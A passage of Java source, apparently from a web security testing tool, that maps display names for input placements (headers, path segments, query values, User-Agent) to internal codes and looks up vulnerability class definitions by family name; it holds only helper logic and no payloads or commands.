     * are used in the UI; kinds are used internally.
     */
    public static final String[] PLACEMENT_DISPLAY = {
        "Header Append", "Segment Append", "Segment Prepend",
        "Root Path", "Root Query", "Query Value", "Query Append", "User-Agent"
    };

    private static final String[] PLACEMENT_KINDS = {
        "HDR", "SEG+", "SEG-", "ROOT-P", "ROOT-Q", "QREP", "QAPP", "UA"
    };

    /** Maps a UI display name to its internal placement kind. */
    public static String placementKind(String display) {
        if (display == null) return "QREP";
        for (int i = 0; i < PLACEMENT_DISPLAY.length; i++) {
            if (PLACEMENT_DISPLAY[i].equals(display)) return PLACEMENT_KINDS[i];
        }
        return "QREP";
    }

    /** Short tag for a placement kind, used in technique labels (e.g. "Seg+2"). */
    public static String placementTag(String kind, int position) {
        if (kind == null) return "Placement";
        switch (kind) {
            case "HDR": return "Header+";
            case "SEG+": return "Seg+" + position;
            case "SEG-": return "Seg-" + position;
            case "ROOT-P": return "RootPath";
            case "ROOT-Q": return "RootQuery";
            case "QREP": return "QueryVal";
            case "QAPP": return "QueryApp";
            case "UA": return "UserAgent+";
            default: return kind;
        }
    }

    /** Looks up a class definition by its family name, or null. */
    public static VulnClass find(String family) {
        if (family == null) return null;
        for (VulnClass vc : CLASSES) {
            if (vc.getFamily().equalsIgnoreCase(family)) return vc;
        }
        return null;
    }

    /** Human-readable tier name: CLASSIC -> "Classic". */
    public static String tierName(Tier tier) {
        if (tier == null) return "Classic";
        String n = tier.name();
        return n.charAt(0) + n.substring(1).toLowerCase(java.util.Locale.ROOT);
    }
}